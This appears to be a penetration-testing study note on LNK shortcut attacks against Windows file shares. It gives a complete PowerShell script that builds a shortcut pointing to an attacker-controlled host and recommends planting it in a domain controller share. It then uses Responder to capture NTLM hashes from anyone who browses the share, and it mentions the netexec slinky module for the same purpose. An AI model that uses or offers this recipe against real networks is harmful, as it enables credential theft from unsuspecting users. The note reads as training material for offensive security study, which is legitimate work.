## LNK File Attacks
- Kinda like setting up a watering hole
- Generate a malicious file with PowerShell to dump into a file share

### Malicious File

```
$objShell = New-Object -ComObject WScript.shell
$lnk = $objShell.CreateShortcut("C:\test.lnk")
$lnk.TargetPath = "\\<attacker IP>\@test.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Test"
$lnk.HotKey = "Ctrl+Alt+T"
$lnk.Save()
```
- LNK file tries to resolve to a PNG
- The image points back to attacker machine
- Create the file with elevated PowerShell
- Append `@` or `~` to file name to put it to the top of the list
- Put file in DC shared folder

### Capture Hash
- If we are running Responder and the file is triggered, we can capture a hash
- Run responder: `sudo responder -I eth0 -dPv`

  ![image](https://github.com/user-attachments/assets/c81152b8-3858-47cd-a7a0-28767455dadc)

- Hashes coming in hot
- Consider trying netexec slinky module
